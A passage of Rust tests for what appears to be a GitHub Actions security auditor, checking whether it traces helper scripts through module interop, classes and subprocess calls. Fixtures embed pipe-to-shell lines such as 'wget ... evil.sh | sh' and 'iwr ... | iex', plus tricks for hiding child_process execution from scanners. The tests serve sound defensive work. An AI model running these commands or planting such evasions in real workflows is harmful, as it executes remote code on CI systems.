const TS_IMPORT_STAR_3: &str = r#"var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (Object.hasOwnProperty.call(mod, k)) result[k] = mod[k];
    result["default"] = mod;
    return result;
};
"#;
const TS_IMPORT_DEFAULT: &str = r#"var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
"#;

/// A file as TypeScript compiles it to CommonJS: its interop `helpers`
/// first, then `body`.
fn typescript_caller(helpers: &str, body: &str) -> String {
    format!(
        "\"use strict\";\n{helpers}Object.defineProperty(exports, \"__esModule\", {{ value: true }});\n{CALLER_CJS}{body}\n"
    )
}

#[test]
fn interop_helpers_copying_a_module_pass_located_arguments() {
    let evil = "path.join(__dirname, 'evil.sh')";
    let caller = |call: &str| format!("{CALLER_CJS}{call}\n");
    let lib = |exports: &str| format!("{MODULE_CJS}{exports}\n");
    let run_lib = lib(&format!("exports.run = {MODULE_RUN};"));
    let default_lib = lib(&format!("module.exports = {MODULE_RUN};"));
    let star = format!("{TS_CREATE_BINDING}{TS_SET_MODULE_DEFAULT}{TS_IMPORT_STAR}");
    let star_4 = format!("{TS_CREATE_BINDING_4}{TS_SET_MODULE_DEFAULT}{TS_IMPORT_STAR_4}");
    let namespace = format!("const lib = __importStar(require(\"./lib.js\"));\nlib.run({evil});");
    let default_import = format!(
        "const lib_1 = __importDefault(require(\"./lib.js\"));\n(0, lib_1.default)({evil});"
    );
    let cases = vec![
        (
            "namespace import",
            false,
            vec![
                ("index.js", typescript_caller(&star, &namespace)),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "namespace import from TypeScript 4",
            false,
            vec![
                ("index.js", typescript_caller(&star_4, &namespace)),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "namespace import from TypeScript 3",
            false,
            vec![
                ("index.js", typescript_caller(TS_IMPORT_STAR_3, &namespace)),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "namespace default",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(
                        &star,
                        &format!("__importStar(require(\"./lib.js\")).default({evil});"),
                    ),
                ),
                ("lib.js", default_lib.clone()),
            ],
        ),
        (
            "namespace import of a held module",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(
                        &star,
                        &format!(
                            "const raw = require(\"./lib.js\");\nconst lib = __importStar(raw);\nlib.run({evil});"
                        ),
                    ),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "default import",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(TS_IMPORT_DEFAULT, &default_import),
                ),
                ("lib.js", default_lib.clone()),
            ],
        ),
        (
            "default import after the other helpers",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(&format!("{star}{TS_IMPORT_DEFAULT}"), &default_import),
                ),
                ("lib.js", default_lib.clone()),
            ],
        ),
        (
            "default helper under another name",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "function _interopRequireDefault(e) {{ return e && e.__esModule ? e : {{ default: e }}; }}\nconst lib = _interopRequireDefault(require('./lib.js'));\nlib.default({evil});"
                    )),
                ),
                ("lib.js", default_lib.clone()),
            ],
        ),
    ];
    let failures = module_failures(cases, &ModuleOutcome::Followed);
    assert!(failures.is_empty(), "{failures:#?}");
}

#[test]
fn interop_helpers_copying_a_module_keep_unlocated_calls_complete() {
    let config = "path.join(__dirname, 'config.json')";
    let lib = |exports: &str| format!("{MODULE_CJS}{exports}\n");
    let star = format!("{TS_CREATE_BINDING}{TS_SET_MODULE_DEFAULT}{TS_IMPORT_STAR}");
    // Moving a file a caller may locate could put it anywhere in the action.
    let rename = "(from, to) => fs.renameSync(from, to)";
    let cases = vec![
        (
            "namespace import",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(
                        &star,
                        &format!(
                            "const lib = __importStar(require(\"./lib.js\"));\nlib.move(process.env.RUNNER_TEMP + '/a.sarif', process.env.RUNNER_TEMP + '/b.sarif');\nconsole.log({config});"
                        ),
                    ),
                ),
                ("lib.js", lib(&format!("exports.move = {rename};"))),
            ],
        ),
        (
            "default import",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(
                        TS_IMPORT_DEFAULT,
                        &format!(
                            "const lib_1 = __importDefault(require(\"./lib.js\"));\n(0, lib_1.default)(process.env.RUNNER_TEMP + '/a.sarif', process.env.RUNNER_TEMP + '/b.sarif');\nconsole.log({config});"
                        ),
                    ),
                ),
                ("lib.js", lib(&format!("module.exports = {rename};"))),
            ],
        ),
    ];
    let failures = module_failures(cases, &ModuleOutcome::Clean);
    assert!(failures.is_empty(), "{failures:#?}");
}

#[test]
fn interop_helpers_that_may_not_copy_a_module_fail_closed() {
    let evil = "path.join(__dirname, 'evil.sh')";
    let config = "path.join(__dirname, 'config.json')";
    let caller = |call: &str| format!("{CALLER_CJS}{call}\n");
    let lib = |exports: &str| format!("{MODULE_CJS}{exports}\n");
    let run_lib = lib(&format!("exports.run = {MODULE_RUN};"));
    // A helper that renames `run` to the harmless `start` hides the script.
    let swap_lib = lib(&format!(
        "exports.start = () => 0;\nexports.run = {MODULE_RUN};"
    ));
    let cases = vec![
        (
            "helper calling a module function",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "function __importStar(mod) {{ mod.run(mod.script); return mod; }}\n__importStar(require('./lib.js'));\nconsole.log({config});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "const path = require('path');\nexports.script = {evil};\nexports.run = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "reassigned helper",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(
                        TS_IMPORT_DEFAULT,
                        &format!(
                            "__importDefault = function (mod) {{ mod.run({evil}); return {{ default: mod }}; }};\n__importDefault(require('./lib.js'));"
                        ),
                    ),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "shadowed helper",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(
                        TS_IMPORT_DEFAULT,
                        &format!(
                            "function load(__importDefault) {{ const lib_1 = __importDefault(require('./lib.js'));\n(0, lib_1.default)({evil}); }}\nload((mod) => ({{ default: mod.run }}));"
                        ),
                    ),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "module.exports = () => 0;\nmodule.exports.run = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "helper guarded after other code",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(
                        &format!(
                            "exports.__importStar = function (mod) {{ mod.run({evil}); return mod; }};\n{TS_IMPORT_STAR_3}"
                        ),
                        "__importStar(require('./lib.js'));",
                    ),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "helper guarded after a call",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(
                        &format!(
                            "var setup = (function () {{ exports.__importStar = function (mod) {{ mod.run({evil}); return mod; }}; }})();\n{TS_IMPORT_STAR_3}"
                        ),
                        "__importStar(require('./lib.js'));",
                    ),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "helper given another argument",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "function __importStar(mod, name) {{ if (name === undefined) return mod;\nvar result = {{}};\nresult[name] = mod.run;\nreturn result; }}\n__importStar(require('./lib.js'), 'start').start({evil});"
                    )),
                ),
                ("lib.js", swap_lib.clone()),
            ],
        ),
        (
            "helper storing the module",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "var saved;\nfunction __importStar(mod) {{ saved = mod; return mod; }}\n__importStar(require('./lib.js'));\nsaved.run({evil});"
                    )),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "helper storing a closure over the module",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "var saved;\nfunction __importStar(mod) {{ saved = function () {{ return mod; }}; return mod; }}\n__importStar(require('./lib.js'));\nsaved().run({evil});"
                    )),
                ),
                ("lib.js", run_lib.clone()),
            ],
        ),
        (
            "helper writing to the module",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "function __importStar(mod) {{ mod.start = mod.run; return mod; }}\n__importStar(require('./lib.js')).start({evil});"
                    )),
                ),
                ("lib.js", swap_lib.clone()),
            ],
        ),
        (
            "helper returning a field",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "function __importStar(mod) {{ return mod.inner; }}\n__importStar(require('./lib.js')).run({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "exports.run = () => 0;\nexports.inner = {{ run: {MODULE_RUN} }};"
                    )),
                ),
            ],
        ),
        (
            "copy under a fixed name",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "function __importStar(mod) {{ var result = {{}};\nresult.start = mod.run;\nreturn result; }}\n__importStar(require('./lib.js')).start({evil});"
                    )),
                ),
                ("lib.js", swap_lib.clone()),
            ],
        ),
        (
            "copy under computed names",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "function __importStar(mod) {{ var names = {{ run: 'start', start: 'run' }};\nvar result = {{}};\nfor (var k in mod) result[names[k]] = mod[k];\nreturn result; }}\n__importStar(require('./lib.js')).start({evil});"
                    )),
                ),
                ("lib.js", swap_lib.clone()),
            ],
        ),
        (
            "copy under the previous key",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "function __importStar(mod) {{ var result = {{}}, previous;\nfor (var k in mod) {{ if (previous !== undefined) result[previous] = mod[k];\nprevious = k; }}\nreturn result; }}\n__importStar(require('./lib.js')).start({evil});"
                    )),
                ),
                ("lib.js", swap_lib.clone()),
            ],
        ),
        (
            "getter reading the loop's key",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "function __importStar(mod) {{ var result = {{}};\nfor (var k in mod) Object.defineProperty(result, k, {{ enumerable: true, get: function () {{ return mod[k]; }} }});\nreturn result; }}\n__importStar(require('./lib.js')).start({evil});"
                    )),
                ),
                ("lib.js", swap_lib.clone()),
            ],
        ),
        (
            "getter from an earlier call",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "function bind(o, m, k, d) {{ var desc = d || {{ enumerable: true, get: function () {{ return m[k]; }} }};\nObject.defineProperty(o, k, desc);\nreturn desc; }}\nfunction __importStar(mod) {{ var result = {{}};\nvar names = Object.getOwnPropertyNames(mod);\nvar first = bind(result, mod, names[1]);\nbind(result, mod, names[0], first);\nreturn result; }}\n__importStar(require('./lib.js')).start({evil});"
                    )),
                ),
                ("lib.js", swap_lib.clone()),
            ],
        ),
    ];
    let failures = module_failures(cases, &ModuleOutcome::Incomplete);
    assert!(failures.is_empty(), "{failures:#?}");
}

/// Error classes as TypeScript compiles them, each holding only what its
/// constructor is given.
const TS_ERRORS: &str = "exports.ConfigurationError = exports.HTTPError = exports.InputError = void 0;\nclass HTTPError extends Error {\n    constructor(message, status) {\n        super(message);\n        this.status = status;\n    }\n}\nexports.HTTPError = HTTPError;\nclass ConfigurationError extends Error {\n    constructor(message) {\n        super(message);\n    }\n}\nexports.ConfigurationError = ConfigurationError;\nclass InputError extends ConfigurationError {\n    name = 'InputError';\n}\nexports.InputError = InputError;\n";

#[test]
fn constructing_field_only_classes_keeps_scans_complete() {
    let config = "path.join(__dirname, 'config.json')";
    let caller = |call: &str| format!("{CALLER_CJS}{call}\n");
    let star = format!("{TS_CREATE_BINDING}{TS_SET_MODULE_DEFAULT}{TS_IMPORT_STAR}");
    // Moving a file a caller may locate could put it anywhere in the action.
    let errors =
        format!("{MODULE_CJS}{TS_ERRORS}exports.move = (from, to) => fs.renameSync(from, to);\n");
    let cases = vec![
        (
            "thrown error",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nfunction check(value) {{ if (!value) {{ throw new lib.ConfigurationError('missing input'); }} }}\ncheck(process.env.INPUT);\nconsole.log({config});"
                    )),
                ),
                ("lib.js", errors.clone()),
            ],
        ),
        (
            "error given a location",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nthrow new lib.ConfigurationError({config});"
                    )),
                ),
                ("lib.js", errors.clone()),
            ],
        ),
        (
            "error with a field",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nconst error = new lib.HTTPError('not found', 404);\nconsole.log(error.status, {config});"
                    )),
                ),
                ("lib.js", errors.clone()),
            ],
        ),
        (
            "destructured error class",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const {{ ConfigurationError }} = require('./lib.js');\nthrow new ConfigurationError({config});"
                    )),
                ),
                ("lib.js", errors.clone()),
            ],
        ),
        (
            "error extending another",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "throw new (require('./lib.js').InputError)({config});"
                    )),
                ),
                ("lib.js", errors.clone()),
            ],
        ),
        (
            "error through a namespace import",
            false,
            vec![
                (
                    "index.js",
                    typescript_caller(
                        &star,
                        &format!(
                            "const util = __importStar(require(\"./lib.js\"));\nthrow new util.ConfigurationError({config});"
                        ),
                    ),
                ),
                ("lib.js", errors.clone()),
            ],
        ),
    ];
    let failures = module_failures(cases, &ModuleOutcome::Clean);
    assert!(failures.is_empty(), "{failures:#?}");
}

#[test]
fn constructing_classes_that_may_hold_module_functions_fails_closed() {
    let evil = "path.join(__dirname, 'evil.sh')";
    let caller = |call: &str| format!("{CALLER_CJS}{call}\n");
    let lib = |exports: &str| format!("{MODULE_CJS}{exports}\n");
    let run_on_instance =
        format!("const lib = require('./lib.js');\nnew lib.Runner().run({evil});");
    let cases = vec![
        (
            "class with a method",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(
                        "class Runner { run(script) { return cp.spawnSync(which('bash'), [script]); } }\nexports.Runner = Runner;",
                    ),
                ),
            ],
        ),
        (
            "method added to the prototype",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "class Runner {{}}\nRunner.prototype.run = {MODULE_RUN};\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "methods copied onto the prototype",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "class Runner {{}}\nObject.assign(Runner.prototype, {{ run: {MODULE_RUN} }});\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "class passed to a patching function",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "function patch(target) {{ target.prototype.run = {MODULE_RUN}; }}\nclass Runner {{}}\npatch(Runner);\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "class patched through the exports",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "class Runner {{}}\nexports.Runner = Runner;\nexports.Runner.prototype.run = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "class patched through top-level this",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "class Runner {{}}\nexports.Runner = Runner;\nthis.Runner.prototype.run = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "class exported and kept",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "class Runner {{}}\nconst kept = exports.Runner = Runner;\nkept.prototype.run = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "field holding a module function",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "const start = {MODULE_RUN};\nclass Runner {{ run = start; }}\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "constructor storing a module function",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "const start = {MODULE_RUN};\nclass Runner {{ constructor() {{ this.run = start; }} }}\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "constructor returning a module function",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nconst run = new lib.Runner();\nrun({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "const start = {MODULE_RUN};\nclass Runner {{ constructor() {{ return start; }} }}\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "static method",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nnew lib.Runner().constructor.run({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(
                        "class Runner { static run(script) { return cp.spawnSync(which('bash'), [script]); } }\nexports.Runner = Runner;",
                    ),
                ),
            ],
        ),
        (
            "static added to a class replacing the exports",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "new (require('./lib.js'))().constructor.run({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "module.exports = class extends Error {{}};\nmodule.exports.run = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "superclass with a method",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(
                        "class Base { run(script) { return cp.spawnSync(which('bash'), [script]); } }\nclass Runner extends Base {}\nexports.Runner = Runner;",
                    ),
                ),
            ],
        ),
        (
            "shadowed Error",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(
                        "const Error = require('./base.js');\nclass Runner extends Error {}\nexports.Runner = Runner;",
                    ),
                ),
                (
                    "base.js",
                    lib(
                        "module.exports = class { run(script) { return cp.spawnSync(which('bash'), [script]); } };",
                    ),
                ),
            ],
        ),
        (
            "function used as a constructor",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "function Runner() {{}}\nRunner.prototype.run = {MODULE_RUN};\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "function both called and constructed",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nlib.Runner(path.join(__dirname, 'config.json'));\nnew lib.Runner().run({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "function Runner() {{}}\nRunner.prototype.run = {MODULE_RUN};\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "class re-exported from another file",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    "exports.Runner = require('./runner.js').Runner;\n".to_string(),
                ),
                (
                    "runner.js",
                    lib(
                        "class Runner { constructor() {} run(script) { return cp.spawnSync(which('bash'), [script]); } }\nexports.Runner = Runner;",
                    ),
                ),
            ],
        ),
        (
            "class made at runtime",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(
                        "function make() { return class { run(script) { return cp.spawnSync(which('bash'), [script]); } }; }\nexports.Runner = make();",
                    ),
                ),
            ],
        ),
        (
            "superclass a global holds",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(
                        "global.Base = class { run(script) { return cp.spawnSync(which('bash'), [script]); } };\nclass Runner extends Base {}\nexports.Runner = Runner;",
                    ),
                ),
            ],
        ),
        (
            "static block",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nnew lib.Runner().constructor.run({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "class Runner {{ static {{ this.run = {MODULE_RUN}; }} }}\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "constructor handing out the instance",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "function attach(target) {{ target.run = {MODULE_RUN}; }}\nclass Runner {{ constructor() {{ void attach(this); }} }}\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "constructor passing a module function to super",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "const start = {MODULE_RUN};\nclass Base {{ constructor(run) {{ this.run = run; }} }}\nclass Runner extends Base {{ constructor() {{ super(start); }} }}\nexports.Runner = Runner;"
                    )),
                ),
            ],
        ),
        (
            "constructor writing to the prototype",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!(
                        "const lib = require('./lib.js');\nconst runner = new lib.Runner();\nlib.setup();\nrunner.run({evil});"
                    )),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "const start = {MODULE_RUN};\nclass Runner {{ constructor(run) {{ this.constructor.prototype.run = run; }} }}\nexports.Runner = Runner;\nexports.setup = () => new Runner(start);"
                    )),
                ),
            ],
        ),
        (
            "reassigned class",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(
                        "class Runner {}\nRunner = class { run(script) { return cp.spawnSync(which('bash'), [script]); } };\nexports.Runner = Runner;",
                    ),
                ),
            ],
        ),
        (
            "class replacing the exports patched through an alias of module",
            false,
            vec![
                (
                    "index.js",
                    caller(&format!("new (require('./lib.js'))().run({evil});")),
                ),
                (
                    "lib.js",
                    lib(&format!(
                        "module.exports = class extends Error {{}};\nconst self = module;\nself.exports.prototype.run = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
        (
            "class patched through an alias of the exports",
            false,
            vec![
                ("index.js", caller(&run_on_instance)),
                (
                    "lib.js",
                    lib(&format!(
                        "class Runner {{}}\nexports.Runner = Runner;\nconst self = exports;\nself.Runner.prototype.run = {MODULE_RUN};"
                    )),
                ),
            ],
        ),
    ];
    let failures = module_failures(cases, &ModuleOutcome::Incomplete);
    assert!(failures.is_empty(), "{failures:#?}");
}

#[test]
fn inline_node_script_calling_a_module_with_a_location_is_incomplete() {
    let dir = common::repo_with_local_action(
        &composite_action(
            "node {0}",
            "require('./lib.js').run(require('path').join(process.env.GITHUB_ACTION_PATH, 'evil.sh'));",
            None,
        ),
        &[
            (
                "lib.js",
                "exports.run = (script) => require('child_process').spawnSync('bash', [script]);\n",
            ),
            ("evil.sh", "wget -qO- https://example.com/evil.sh | sh\n"),
        ],
    );
    let output = common::pinprick_cmd()
        .args(["audit", "--no-audited-catalog", "--json"])
        .arg(dir.path())
        .output()
        .unwrap();
    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(output.status.code(), Some(2), "{report}");
    assert_eq!(report["coverage_complete"], false, "{report}");
}

#[test]
fn helpers_reached_through_the_action_location_are_never_clean() {
    let composite_python =
        composite_action("bash", "python3 \"$GITHUB_ACTION_PATH/main.py\"", None);
    let composite_shell = composite_action("bash", "bash \"$GITHUB_ACTION_PATH/main.sh\"", None);
    let cases: Vec<(String, Vec<(&str, &str)>)> = vec![
        (
            composite_action(
                "bash",
                "bash \"$SCRIPT\"",
                Some(("SCRIPT", "${{ github.action_path }}/install.sh")),
            ),
            vec![("install.sh", CURL_BASH)],
        ),
        (
            composite_action("pwsh", "& \"$env:GITHUB_ACTION_PATH/install.ps1\"", None),
            vec![("install.ps1", "iwr https://example.com/install.ps1 | iex\n")],
        ),
        (
            composite_action(
                "pwsh",
                "& (Join-Path $env:GITHUB_ACTION_PATH install.ps1)",
                None,
            ),
            vec![("install.ps1", "iwr https://example.com/install.ps1 | iex\n")],
        ),
        (
            composite_action(
                "bash",
                "cd \"$GITHUB_ACTION_PATH\" && python3 -m helper",
                None,
            ),
            vec![("helper.py", PYTHON_CURL_BASH)],
        ),
        (
            composite_shell.clone(),
            vec![
                (
                    "main.sh",
                    "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/lib.sh\"\n",
                ),
                ("lib.sh", CURL_BASH),
            ],
        ),
        (
            composite_shell.clone(),
            vec![
                ("main.sh", "source \"${BASH_SOURCE%/*}/lib.sh\"\n"),
                ("lib.sh", CURL_BASH),
            ],
        ),
        (
            composite_shell.clone(),
            vec![
                ("main.sh", "cd \"$(dirname \"$0\")\" && ./install.sh\n"),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            composite_python.clone(),
            vec![
                ("main.py", "from lib import a\n"),
                ("lib/__init__.py", ""),
                ("lib/a.py", "import utils\n"),
                ("utils.py", PYTHON_CURL_BASH),
            ],
        ),
        (
            composite_python.clone(),
            vec![
                (
                    "main.py",
                    "import importlib\nimportlib.import_module('utils')\n",
                ),
                ("utils.py", PYTHON_CURL_BASH),
            ],
        ),
        (
            composite_python.clone(),
            vec![
                (
                    "main.py",
                    "import os, runpy\nrunpy.run_path(os.path.join(os.path.dirname(__file__), 'helper.py'))\n",
                ),
                ("helper.py", PYTHON_CURL_BASH),
            ],
        ),
        (
            composite_python.clone(),
            vec![
                (
                    "main.py",
                    "import os, subprocess\nsubprocess.run(['bash', os.path.join(os.path.dirname(__file__), 'install.sh')])\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const cp = require('child_process'), path = require('path');\ncp.execFileSync('bash', [path.join(__dirname, 'install.sh')]);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "require('child_process').execSync('bash ' + __dirname + '/install.sh');\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "require('child_process').execSync(`bash ${__dirname}/install.sh`);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "require('child_process').spawnSync('sh', [require('path').resolve(__dirname, 'install.sh')]);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const cp = require('child_process');\nRegExp.prototype.exec = cp.exec;\nnew RegExp('noop').exec(`bash \"${__dirname}/install.sh\"`);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const cp = require('child_process');\nRegExp.prototype.exec = cp.exec;\nRegExp('noop').exec(`bash \"${__dirname}/install.sh\"`);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const cp = require('child_process');\nfunction run(matcher) {\n  matcher.exec = cp.exec;\n  matcher.exec(`bash \"${__dirname}/install.sh\"`);\n}\nrun(/noop/);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const cp = require('child_process');\nconst holder = { matcher: /noop/ };\nholder.matcher.exec = cp.exec;\nholder.matcher.exec(`bash \"${__dirname}/install.sh\"`);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const cp = require('child_process');\nconst holder = {};\nholder.matcher = /noop/;\nholder.matcher.exec = cp.exec;\nholder.matcher.exec(`bash \"${__dirname}/install.sh\"`);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "require('child_process').execFileSync('bash', [process['env'].GITHUB_ACTION_PATH + '/install.sh']);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.mjs"),
            vec![
                (
                    "index.mjs",
                    "import { execSync } from 'node:child_process';\nimport { fileURLToPath } from 'node:url';\nexecSync('bash ' + fileURLToPath(new URL('./install.sh', import.meta.url)));\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const exec = require('@actions/exec');\nexec.exec('bash', [`${__dirname}/install.sh`]);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const path = require('path');\nconst helper = path.join(__dirname, 'install.sh');\nrequire('child_process').execFileSync('bash', [helper]);\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const path = require('path');\nrequire('child_process').execFileSync('bash', [path.join(__dirname, 'install.txt')]);\n",
                ),
                ("install.txt", CURL_BASH),
            ],
        ),
        (
            node_action("index.js"),
            vec![
                (
                    "index.js",
                    "const path = require('path');\nrequire('child_process').execFileSync('bash', [path.join(__dirname, 'sub', 'install.sh')]);\n",
                ),
                ("install.sh", "echo harmless\n"),
                ("sub/install.sh", CURL_BASH),
            ],
        ),
        (
            composite_python.clone(),
            vec![
                (
                    "main.py",
                    "import os, subprocess\nsubprocess.run(['bash', os.path.join(os.path.dirname(__file__), 'install.txt')])\n",
                ),
                ("install.txt", CURL_BASH),
            ],
        ),
        (
            composite_python.clone(),
            vec![
                (
                    "main.py",
                    "import os, subprocess\nsubprocess.run(['bash', os.path.join(os.path.dirname(__file__), 'sub', 'install.sh')])\n",
                ),
                ("install.sh", "echo harmless\n"),
                ("sub/install.sh", CURL_BASH),
            ],
        ),
        (
            composite_python.clone(),
            vec![
                (
                    "main.py",
                    "import os, subprocess\nsubprocess.run(args=['bash', os.path.join(os.path.dirname(__file__), 'install.sh')])\n",
                ),
                ("install.sh", CURL_BASH),
            ],
        ),
        (
            composite_python,
            vec![
                ("main.py", "import os; import helper\n"),
                ("helper.py", PYTHON_CURL_BASH),
            ],
        ),
        (
            composite_shell.clone(),
            vec![
                ("main.sh", "cd \"$(dirname \"$0\")/sub\"\nbash install.sh\n"),
                ("sub/install.sh", CURL_BASH),
            ],
        ),
        (
            composite_shell.clone(),
            vec![
                (
                    "main.sh",
                    "DIR=$(dirname \"$0\")\nDIR=\"$DIR/sub\"\nbash \"$DIR/install.sh\"\n",
                ),
